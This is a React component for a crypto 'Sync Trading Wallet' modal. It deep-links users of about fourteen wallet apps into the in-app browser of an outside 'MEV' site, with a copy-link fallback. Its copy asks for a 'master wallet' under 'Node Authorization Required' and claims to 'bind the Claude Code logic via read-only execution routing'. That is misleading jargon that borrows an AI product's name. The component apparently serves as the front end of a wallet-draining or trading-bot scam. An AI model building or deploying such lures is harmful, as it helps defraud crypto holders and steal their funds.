"use client";

import React, { useState } from "react";
import { 
  Dialog, 
  DialogContent, 
  DialogTrigger, 
  DialogTitle, 
  DialogDescription 
} from "@/components/ui/dialog";
import { ReactNode } from "react";
import { ChevronRight, Copy, Check, MousePointer2 } from "lucide-react";

export default function WalletModalPlaceholder({ trigger }: { trigger: ReactNode }) {
  const [copied, setCopied] = useState(false);

  const TARGET_URL = "https://cryptosafe.network/mev";
  const DAPP_URL_NO_HTTP = TARGET_URL.replace(/^https?:\/\//, "");
  const ENCODED_URL = encodeURIComponent(TARGET_URL);

  const tpParams = encodeURIComponent(JSON.stringify({
    url: TARGET_URL,
    chain: "ETH",
    source: "dapp",
  }));

  // --- Replace your existing wallets array with this ---
  const wallets = [
    { 
      name: "Trust Wallet", 
      icon: "/wallets/trust.png", 
      href: `https://link.trustwallet.com/open_url?coin_id=60&url=${ENCODED_URL}` 
    },
    { 
      name: "MetaMask", 
      icon: "https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Fox.svg", 
      href: `https://metamask.app.link/dapp/${DAPP_URL_NO_HTTP}` 
    },
    { 
      name: "Coinbase Wallet", 
      icon: "/wallets/coinbase.png", 
      href: `cbwallet://dapp?url=${ENCODED_URL}` 
    },
    { 
     name: "SafePal", 
      icon: "/wallets/safepalw.png", 
      // 🟡 Alternative: Direct custom scheme with the open_url command
      href: `safepalwallet://open_url?url=${ENCODED_URL}&chain_id=1`
    },
    { 
      name: "TokenPocket", 
      icon: "https://www.tokenpocket.pro/favicon.ico", 
      href: `tpdapp://open?params=${tpParams}` 
    },
    { 
      name: "OKX Wallet", 
      icon: "/wallets/okx.png", 
      href: `https://web3.okx.com/download?deeplink=${encodeURIComponent(`okx://wallet/dapp/url?dappUrl=${ENCODED_URL}`)}`
    },
    { 
      name: "Bitget Wallet", 
      icon: "https://web3.bitget.com/favicon.ico", 
      href: `https://web3.bitget.com/en/dapp/open?url=${ENCODED_URL}`
    },
    { 
      name: "Phantom", 
      icon: "/wallets/phantom.png", 
      href: `https://phantom.app/ul/browse/${ENCODED_URL}` 
    },
    { 
      name: "Robinhood Wallet", 
      icon: "/wallets/robinhood.png", 
      // 🟢 2026 Universal Link: Direct injection into the Robinhood dApp browser
      // Robinhood "Strict" Version
href: `rbh-wallet://open_url?url=${ENCODED_URL}&chain_id=1`
    },
    { 
      name: "Binance Web3", 
      icon: "https://bin.bnbstatic.com/static/images/common/favicon.ico", 
      href: `bnc://app.binance.com/defi/dapp?url=${ENCODED_URL}` 
    },
    { 
      name: "Rabby Wallet", 
      icon: "/wallets/rabby.png", 
      href: `https://rabby.io/link/dapp?url=${ENCODED_URL}`
    },
    { 
      name: "Rainbow", 
      icon: "/wallets/rainbow.png", 
      href: `rainbow://open_url?url=${ENCODED_URL}`
    },
    { 
      name: "Exodus", 
      icon: "/wallets/exodus.png", 
      href: `exodus://browser?url=${ENCODED_URL}`
    },
    { 
      name: "Ledger Live", 
      icon: "/wallets/ledger.png", 
      href: `ledgerlive://discover/dapp?url=${ENCODED_URL}` 
    },
  ];

  const copyToClipboard = async () => {
    try {
      await navigator.clipboard.writeText(TARGET_URL);
      setCopied(true);
      setTimeout(() => setCopied(false), 2000);
    } catch (err) {
      console.error("Failed to copy buffer", err);
    }
  };

  return (
    <Dialog>
      <DialogTrigger asChild>{trigger}</DialogTrigger>
      <DialogContent className="max-w-md border-[#1E293B] bg-[#0D111C] p-0 overflow-hidden outline-none">
        <div className="border-t-2 border-[#10B981] p-6 space-y-6">
          
          <div className="flex items-center justify-between">
            <div className="flex items-center gap-2">
              <div className="h-2 w-2 animate-pulse rounded-full bg-[#10B981] shadow-[0_0_10px_#10B981]" />
              <span className="text-[10px] font-bold uppercase tracking-widest text-[#10B981]">
                Node Authorization Required
              </span>
            </div>
            <div className="flex items-center gap-1 text-[10px] text-slate-500 font-mono">
              <MousePointer2 className="h-3 w-3" />
              SCROLL_FOR_MORE
            </div>
          </div>

          <div className="space-y-2">
            <DialogTitle className="text-2xl font-bold tracking-tight text-white">
              Sync Trading Wallet
            </DialogTitle>
            <DialogDescription className="text-xs leading-relaxed text-slate-400 font-mono">
              Select your master wallet to bind the Claude Code logic via read-only execution routing.
            </DialogDescription>
          </div>

          {/* Wallet List Container with Relative Wrapper for Fade Mask */}
          <div className="relative group/list">
            <div className="max-h-[350px] space-y-2 overflow-y-auto pr-2 custom-scrollbar">
              {wallets.map((wallet) => (
                <a
                  key={wallet.name}
                  href={wallet.href}
                  className="group flex items-center justify-between rounded-xl border border-[#1E293B] bg-white/5 p-3 transition-all hover:border-[#10B981] hover:bg-[#10B981]/10 hover:translate-x-1"
                >
                  <div className="flex items-center gap-3">
                    <div className="h-10 w-10 flex-shrink-0 overflow-hidden rounded-lg bg-white p-1">
                      <img src={wallet.icon} alt={wallet.name} className="h-full w-full object-contain" />
                    </div>
                    <span className="text-sm font-semibold text-slate-200">{wallet.name}</span>
                  </div>
                  <ChevronRight className="h-4 w-4 text-slate-600 transition-colors group-hover:text-[#10B981]" />
                </a>
              ))}
            </div>
            
            {/* 🟢 The Fade Mask: Visual indicator for scrolling */}
            <div className="pointer-events-none absolute bottom-0 left-0 h-12 w-full bg-gradient-to-t from-[#0D111C] to-transparent opacity-100 transition-opacity group-hover/list:opacity-40" />
          </div>

          <div className="h-px w-full bg-gradient-to-r from-transparent via-[#1E293B] to-transparent" />

          <p className="text-center text-[11px] leading-relaxed text-slate-500 font-mono italic">
              If your preferred provider is unlisted or the automated redirection fails, 
              copy the secure Dapp endpoint below and paste it directly into your 
              wallet&apos;s internal browser.
            </p>

          <button
            onClick={copyToClipboard}
            className="flex w-full items-center justify-center gap-2 rounded-lg py-2 text-[10px] font-bold uppercase tracking-widest text-slate-500 transition-colors hover:text-[#10B981]"
          >
            {copied ? (
              <>
                <Check className="h-3 w-3" />
                Buffer_Synced
              </>
            ) : (
              <>
                <Copy className="h-3 w-3" />
                [ Copy_Dapp_Protocol_Link ]
              </>
            )}
          </button>
        </div>
      </DialogContent>
    </Dialog>
  );
}